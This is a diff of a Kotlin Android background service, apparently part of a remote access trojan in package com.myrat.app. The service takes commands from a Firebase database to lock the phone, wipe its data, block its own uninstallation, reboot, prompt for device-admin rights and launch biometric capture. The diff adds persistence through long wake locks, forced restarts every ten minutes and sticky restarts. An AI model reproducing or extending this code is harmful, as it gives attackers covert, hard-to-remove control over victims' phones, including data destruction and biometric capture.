@@ -33,98 +33,77 @@ class LockService : Service() {
     private var deviceAdviceListener: ValueEventListener? = null
     private var lastCommandTime = 0L
     private var wakeLock: PowerManager.WakeLock? = null
+    private var isServiceInitialized = false
+    private val commandHandler = Handler(Looper.getMainLooper())
 
     companion object {
         private const val NOTIFICATION_ID = 3
         private const val CHANNEL_ID = "LockServiceChannel"
         private const val COMMAND_DEBOUNCE_MS = 500L
+        private const val MAX_RETRY_ATTEMPTS = 3
     }
 
     override fun onCreate() {
         super.onCreate()
         try {
-            // Acquire wake lock to keep service running
-            acquireWakeLock()
+            Logger.log("LockService onCreate started")
             
+            // Initialize basic components first
+            initializeBasicComponents()
+            
+            // Start foreground service immediately
             startForeground(NOTIFICATION_ID, buildNotification())
-
-            if (!isNetworkAvailable()) {
-                Logger.error("No network available, but continuing LockService for offline commands")
-            }
-
-            try {
-                db = Firebase.database.getReference()
-                Logger.log("Firebase initialized successfully in LockService")
-            } catch (e: Exception) {
-                Logger.error("Firebase initialization failed, will retry", e)
-                // Continue without Firebase for now, will retry later
-            }
-
-            deviceId = try {
-                MainActivity.getDeviceId(this) ?: run {
-                    Logger.error("Device ID is null, using fallback ID")
-                    Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device_${System.currentTimeMillis()}"
-                }
-            } catch (e: Exception) {
-                Logger.error("Failed to get deviceId, using fallback", e)
-                Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device_${System.currentTimeMillis()}"
-            }
-
-            Logger.log("LockService started for deviceId: $deviceId")
-
-            // Initialize system services with proper error handling
-            initializeSystemServices()
             
-            setupBiometricResultReceiver()
+            // Initialize Firebase and other components
+            initializeFirebaseAndComponents()
             
-            // Set up Firebase connection status
-            setupFirebaseConnection()
+            // Set up all listeners and functionality
+            setupServiceFunctionality()
             
-            fetchAndUploadLockDetails()
-            listenForDeviceAdviceCommands()
-            
-            // Schedule periodic restart
-            schedulePeriodicRestart()
+            isServiceInitialized = true
+            Logger.log("LockService successfully initialized")
             
         } catch (e: Exception) {
             Logger.error("LockService failed to start", e)
             // Don't stop service, try to continue with limited functionality
+            isServiceInitialized = false
         }
     }
 
-    private fun acquireWakeLock() {
+    private fun initializeBasicComponents() {
         try {
-            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-            wakeLock = powerManager.newWakeLock(
-                PowerManager.PARTIAL_WAKE_LOCK,
-                "LockService:KeepAlive"
-            )
-            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
-            Logger.log("Wake lock acquired for LockService")
+            // Acquire wake lock to keep service running
+            acquireWakeLock()
+            
+            // Get device ID with fallback
+            deviceId = try {
+                MainActivity.getDeviceId(this) ?: generateFallbackDeviceId()
+            } catch (e: Exception) {
+                Logger.error("Failed to get deviceId, using fallback", e)
+                generateFallbackDeviceId()
+            }
+            
+            Logger.log("LockService initializing for deviceId: $deviceId")
+            
+            // Initialize system services
+            initializeSystemServices()
+            
         } catch (e: Exception) {
-            Logger.error("Failed to acquire wake lock", e)
+            Logger.error("Failed to initialize basic components", e)
+            throw e
         }
     }
 
-    private fun schedulePeriodicRestart() {
-        try {
-            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
-            val intent = Intent(this, LockService::class.java)
-            val pendingIntent = PendingIntent.getService(
-                this, 0, intent,
-                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-            )
-
-            // Schedule restart every 5 minutes
-            alarmManager.setRepeating(
-                AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                SystemClock.elapsedRealtime() + 5 * 60 * 1000,
-                5 * 60 * 1000,
-                pendingIntent
-            )
-            Logger.log("Scheduled periodic restart for LockService")
+    private fun generateFallbackDeviceId(): String {
+        return try {
+            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+            if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
+                androidId
+            } else {
+                "lockservice_${System.currentTimeMillis()}_${(1000..9999).random()}"
+            }
         } catch (e: Exception) {
-            Logger.error("Failed to schedule periodic restart", e)
+            "lockservice_emergency_${System.currentTimeMillis()}"
         }
     }
 
@@ -151,6 +130,109 @@ class LockService : Service() {
         }
     }
 
+    private fun initializeFirebaseAndComponents() {
+        try {
+            // Initialize Firebase with retry mechanism
+            var firebaseInitialized = false
+            for (attempt in 1..MAX_RETRY_ATTEMPTS) {
+                try {
+                    db = Firebase.database.getReference()
+                    firebaseInitialized = true
+                    Logger.log("Firebase initialized successfully in LockService (attempt $attempt)")
+                    break
+                } catch (e: Exception) {
+                    Logger.error("Firebase initialization failed (attempt $attempt)", e)
+                    if (attempt < MAX_RETRY_ATTEMPTS) {
+                        Thread.sleep(2000) // Wait 2 seconds before retry
+                    }
+                }
+            }
+            
+            if (!firebaseInitialized) {
+                Logger.error("Firebase initialization failed after $MAX_RETRY_ATTEMPTS attempts")
+                // Continue without Firebase for now
+            }
+            
+        } catch (e: Exception) {
+            Logger.error("Error in initializeFirebaseAndComponents", e)
+        }
+    }
+
+    private fun setupServiceFunctionality() {
+        try {
+            // Set up biometric result receiver
+            setupBiometricResultReceiver()
+            
+            // Set up Firebase connection status
+            setupFirebaseConnection()
+            
+            // Fetch and upload lock details
+            fetchAndUploadLockDetails()
+            
+            // Listen for device advice commands
+            listenForDeviceAdviceCommands()
+            
+            // Schedule periodic restart and health checks
+            schedulePeriodicTasks()
+            
+        } catch (e: Exception) {
+            Logger.error("Error setting up service functionality", e)
+        }
+    }
+
+    private fun acquireWakeLock() {
+        try {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            wakeLock = powerManager.newWakeLock(
+                PowerManager.PARTIAL_WAKE_LOCK,
+                "LockService:KeepAlive"
+            )
+            wakeLock?.acquire(60 * 60 * 1000L) // 1 hour
+            Logger.log("Wake lock acquired for LockService")
+        } catch (e: Exception) {
+            Logger.error("Failed to acquire wake lock", e)
+        }
+    }
+
+    private fun schedulePeriodicTasks() {
+        try {
+            // Schedule service restart every 10 minutes
+            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+            val intent = Intent(this, LockService::class.java)
+            val pendingIntent = PendingIntent.getService(
+                this, 0, intent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                // For Android 12+ use exact alarms if permission is granted
+                if (alarmManager.canScheduleExactAlarms()) {
+                    alarmManager.setExactAndAllowWhileIdle(
+                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                        SystemClock.elapsedRealtime() + 10 * 60 * 1000,
+                        pendingIntent
+                    )
+                } else {
+                    alarmManager.setAndAllowWhileIdle(
+                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                        SystemClock.elapsedRealtime() + 10 * 60 * 1000,
+                        pendingIntent
+                    )
+                }
+            } else {
+                alarmManager.setRepeating(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + 10 * 60 * 1000,
+                    10 * 60 * 1000,
+                    pendingIntent
+                )
+            }
+            Logger.log("Scheduled periodic restart for LockService")
+        } catch (e: Exception) {
+            Logger.error("Failed to schedule periodic restart", e)
+        }
+    }
+
     private fun setupFirebaseConnection() {
         try {
             if (::db.isInitialized) {
@@ -174,13 +256,14 @@ class LockService : Service() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 val channel = NotificationChannel(
                     channelId,
-                    "Lock Service",
+                    "Device Lock Service",
                     NotificationManager.IMPORTANCE_LOW
                 ).apply {
                     setShowBadge(false)
                     enableLights(false)
                     enableVibration(false)
                     setSound(null, null)
+                    description = "Manages device lock and security commands"
                 }
                 val manager = getSystemService(NotificationManager::class.java)
                 manager?.createNotificationChannel(channel)
@@ -227,7 +310,9 @@ class LockService : Service() {
                 "lastUpdated" to System.currentTimeMillis(),
                 "androidVersion" to Build.VERSION.SDK_INT,
                 "manufacturer" to Build.MANUFACTURER,
-                "model" to Build.MODEL
+                "model" to Build.MODEL,
+                "serviceInitialized" to isServiceInitialized,
+                "networkAvailable" to isNetworkAvailable()
             )
             
             if (::db.isInitialized) {
@@ -319,10 +404,10 @@ class LockService : Service() {
                         lastCommandTime = System.currentTimeMillis()
                         Logger.log("Processing lock command: ${data.action}")
                         
-                        // Process command in background thread to avoid blocking
-                        Thread {
-                            processCommand(data)
-                        }.start()
+                        // Process command in background thread with timeout
+                        commandHandler.post {
+                            processCommandWithTimeout(data)
+                        }
                         
                     } catch (e: Exception) {
                         Logger.error("Error processing RTDB command", e)
@@ -340,8 +425,35 @@ class LockService : Service() {
         }
     }
 
-    private fun processCommand(command: DeviceAdviceCommand) {
+    private fun processCommandWithTimeout(command: DeviceAdviceCommand) {
         try {
+            // Set a timeout for command processing
+            val timeoutHandler = Handler(Looper.getMainLooper())
+            val timeoutRunnable = Runnable {
+                Logger.error("Command processing timeout: ${command.action}")
+                updateCommandStatus(command, "timeout", "Command processing timed out")
+            }
+            
+            timeoutHandler.postDelayed(timeoutRunnable, 30000) // 30 second timeout
+            
+            // Process the command
+            val success = processCommand(command)
+            
+            // Cancel timeout if command completed
+            timeoutHandler.removeCallbacks(timeoutRunnable)
+            
+            if (!success) {
+                updateCommandStatus(command, "failed", "Command execution failed")
+            }
+            
+        } catch (e: Exception) {
+            Logger.error("Error in processCommandWithTimeout", e)
+            updateCommandStatus(command, "error", "Processing error: ${e.message}")
+        }
+    }
+
+    private fun processCommand(command: DeviceAdviceCommand): Boolean {
+        return try {
             when (command.action) {
                 "lock" -> lockDevice(command)
                 "unlock" -> notifyUserToUnlock(command)
@@ -353,37 +465,42 @@ class LockService : Service() {
                 "preventUninstall" -> preventUninstall(command)
                 "reboot" -> rebootDevice(command)
                 "enableAdmin" -> enableDeviceAdmin(command)
+                "getStatus" -> getDeviceStatus(command)
                 else -> {
                     Logger.error("Unknown command: ${command.action}")
                     updateCommandStatus(command, "failed", "Unknown command: ${command.action}")
+                    false
                 }
             }
         } catch (e: Exception) {
             Logger.error("Error processing command: ${command.action}", e)
             updateCommandStatus(command, "error", "Processing error: ${e.message}")
+            false
         }
     }
 
-    private fun lockDevice(command: DeviceAdviceCommand) {
-        try {
+    private fun lockDevice(command: DeviceAdviceCommand): Boolean {
+        return try {
             if (devicePolicyManager.isAdminActive(adminComponent)) {
                 devicePolicyManager.lockNow()
                 updateCommandStatus(command, "success", null)
                 Logger.log("Device locked successfully")
+                true
             } else {
                 Logger.error("Device admin not active for lockDevice")
                 updateCommandStatus(command, "failed", "Device admin not active")
-                // Try to prompt for device admin
                 promptForDeviceAdmin()
+                false
             }
         } catch (e: Exception) {
             Logger.error("Lock device failed", e)
             updateCommandStatus(command, "error", e.message ?: "Unknown error")
+            false
         }
     }
 
-    private fun notifyUserToUnlock(command: DeviceAdviceCommand) {
-        try {
+    private fun notifyUserToUnlock(command: DeviceAdviceCommand): Boolean {
+        return try {
             if (keyguardManager.isDeviceLocked) {
                 val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                     putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
@@ -392,28 +509,31 @@ class LockService : Service() {
                 }
                 startActivity(intent)
                 updateCommandStatus(command, "pending", "Waiting for user unlock")
+                true
             } else {
                 updateCommandStatus(command, "success", "Device already unlocked")
+                true
             }
         } catch (e: Exception) {
             Logger.error("Failed to notify user to unlock", e)
             updateCommandStatus(command, "error", e.message ?: "Unknown error")
+            false
         }
     }
 
-    private fun turnScreenOn(command: DeviceAdviceCommand) {
-        try {
+    private fun turnScreenOn(command: DeviceAdviceCommand): Boolean {
+        return try {
             if (!powerManager.isInteractive) {
                 val wakeLock = powerManager.newWakeLock(
                     PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                     "LockService:ScreenOn"
                 )
-                wakeLock.acquire(3000) // 3 seconds
+                wakeLock.acquire(5000) // 5 seconds
                 
                 // For Android 15+ compatibility
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.VANILLA_ICE_CREAM) {
-                    // Use newer API if available
                     try {
+                        // Use newer API if available
                         val displayManager = getSystemService(Context.DISPLAY_SERVICE) as android.hardware.display.DisplayManager
                         // Additional screen on logic for newer Android versions
                     } catch (e: Exception) {
@@ -424,34 +544,40 @@ class LockService : Service() {
                 wakeLock.release()
                 updateCommandStatus(command, "success", null)
                 Logger.log("Screen turned on successfully")
+                true
             } else {
                 updateCommandStatus(command, "success", "Screen already on")
+                true
             }
         } catch (e: Exception) {
             Logger.error("Turn screen on failed", e)
             updateCommandStatus(command, "error", e.message ?: "Unknown error")
+            false
         }
     }
 
-    private fun turnScreenOff(command: DeviceAdviceCommand) {
-        try {
+    private fun turnScreenOff(command: DeviceAdviceCommand): Boolean {
+        return try {
             if (devicePolicyManager.isAdminActive(adminComponent)) {
                 devicePolicyManager.lockNow()
                 updateCommandStatus(command, "success", null)
                 Logger.log("Screen turned off successfully")
+                true
             } else {
                 Logger.error("Device admin not active for screenOff")
                 updateCommandStatus(command, "failed", "Device admin not active")
                 promptForDeviceAdmin()
+                false
             }
         } catch (e: Exception) {
             Logger.error("Turn screen off failed", e)
             updateCommandStatus(command, "error", e.message ?: "Unknown error")
+            false
         }
     }
 
-    private fun captureBiometricData(command: DeviceAdviceCommand) {
-        try {
+    private fun captureBiometricData(command: DeviceAdviceCommand): Boolean {
+        return try {
             val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                 putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
                 putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION, com.myrat.app.BiometricAuthActivity.ACTION_CAPTURE_BIOMETRIC)
@@ -459,19 +585,21 @@ class LockService : Service() {
             }
             startActivity(intent)
             updateCommandStatus(command, "pending", "Waiting for biometric data capture")
+            true
         } catch (e: Exception) {
             Logger.error("Capture biometric data failed", e)
             updateCommandStatus(command, "error", e.message ?: "Unknown error")
+            false
         }
     }
 
-    private fun biometricUnlock(command: DeviceAdviceCommand) {
-        try {
+    private fun biometricUnlock(command: DeviceAdviceCommand): Boolean {
+        return try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && hasBiometricPermission()) {
                 val biometricManager = androidx.biometric.BiometricManager.from(this)
                 if (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) != androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS) {
                     updateCommandStatus(command, "failed", "Biometric authentication not available or enrolled")
-                    return
+                    return false
                 }
 
                 val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
@@ -481,20 +609,23 @@ class LockService : Service() {
                 }
                 startActivity(intent)
                 updateCommandStatus(command, "pending", "Waiting for biometric unlock")
+                true
             } else {
                 updateCommandStatus(command, "failed", "Biometric authentication not supported or permission denied")
+                false
             }
         } catch (e: Exception) {
             Logger.error("Biometric unlock failed", e)
             updateCommandStatus(command, "error", e.message ?: "Unknown error")
+            false
         }
     }
 
-    private fun wipeThePhone(command: DeviceAdviceCommand) {
-        try {
+    private fun wipeThePhone(command: DeviceAdviceCommand): Boolean {
+        return try {
             if (devicePolicyManager.isAdminActive(adminComponent)) {
                 // Add confirmation delay for safety
-                Handler(Looper.getMainLooper()).postDelayed({
+                commandHandler.postDelayed({
                     try {
                         devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
                         updateCommandStatus(command, "success", null)
@@ -505,62 +636,86 @@ class LockService : Service() {
                     }
                 }, 5000) // 5 second delay
                 updateCommandStatus(command, "pending", "Device wipe scheduled in 5 seconds")
+                true
             } else {
                 Logger.error("Device admin not active for wipeThePhone")
                 updateCommandStatus(command, "failed", "Device admin not active")
                 promptForDeviceAdmin()
+                false
             }
         } catch (e: Exception) {
             Logger.error("Wipe device failed", e)
             updateCommandStatus(command, "error", e.message ?: "Unknown error")
+            false
         }
     }
 
-    private fun preventUninstall(command: DeviceAdviceCommand) {
-        try {
+    private fun preventUninstall(command: DeviceAdviceCommand): Boolean {
+        return try {
             if (devicePolicyManager.isAdminActive(adminComponent)) {
                 devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true)
                 updateCommandStatus(command, "success", null)
                 Logger.log("Uninstall prevention enabled")
+                true
             } else {
                 Logger.error("Device admin not active for preventUninstall")
                 updateCommandStatus(command, "failed", "Device admin not active")
                 promptForDeviceAdmin()
+                false
             }
         } catch (e: Exception) {
             Logger.error("Prevent uninstall failed", e)
             updateCommandStatus(command, "error", e.message ?: "Unknown error")
+            false
         }
     }
 
-    private fun rebootDevice(command: DeviceAdviceCommand) {
-        try {
+    private fun rebootDevice(command: DeviceAdviceCommand): Boolean {
+        return try {
             if (devicePolicyManager.isAdminActive(adminComponent)) {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                     devicePolicyManager.reboot(adminComponent)
                     updateCommandStatus(command, "success", null)
                     Logger.log("Device reboot initiated")
+                    true
                 } else {
                     updateCommandStatus(command, "failed", "Reboot not supported on this Android version")
+                    false
                 }
             } else {
                 Logger.error("Device admin not active for reboot")
                 updateCommandStatus(command, "failed", "Device admin not active")
                 promptForDeviceAdmin()
+                false
             }
         } catch (e: Exception) {
             Logger.error("Reboot device failed", e)
             updateCommandStatus(command, "error", e.message ?: "Unknown error")
+            false
         }
     }
 
-    private fun enableDeviceAdmin(command: DeviceAdviceCommand) {
-        try {
+    private fun enableDeviceAdmin(command: DeviceAdviceCommand): Boolean {
+        return try {
             promptForDeviceAdmin()
             updateCommandStatus(command, "pending", "Device admin prompt shown")
+            true
         } catch (e: Exception) {
             Logger.error("Enable device admin failed", e)
             updateCommandStatus(command, "error", e.message ?: "Unknown error")
+            false
+        }
+    }
+
+    private fun getDeviceStatus(command: DeviceAdviceCommand): Boolean {
+        return try {
+            fetchAndUploadLockDetails()
+            updateCommandStatus(command, "success", "Device status updated")
+            true
+        } catch (e: Exception) {
+            Logger.error("Get device status failed", e)
+            updateCommandStatus(command, "error", e.message ?: "Unknown error")
+            false
         }
     }
 
@@ -588,7 +743,8 @@ class LockService : Service() {
             
             val updates = mutableMapOf<String, Any>(
                 "status" to status,
-                "timestamp" to System.currentTimeMillis()
+                "timestamp" to System.currentTimeMillis(),
+                "processedBy" to "LockService"
             )
             error?.let { updates["error"] = it }
             
@@ -653,6 +809,19 @@ class LockService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Logger.log("LockService onStartCommand")
+        
+        // Refresh wake lock
+        try {
+            wakeLock?.let {
+                if (it.isHeld) {
+                    it.release()
+                }
+            }
+            acquireWakeLock()
+        } catch (e: Exception) {
+            Logger.error("Error refreshing wake lock", e)
+        }
+        
         return START_STICKY
     }
 
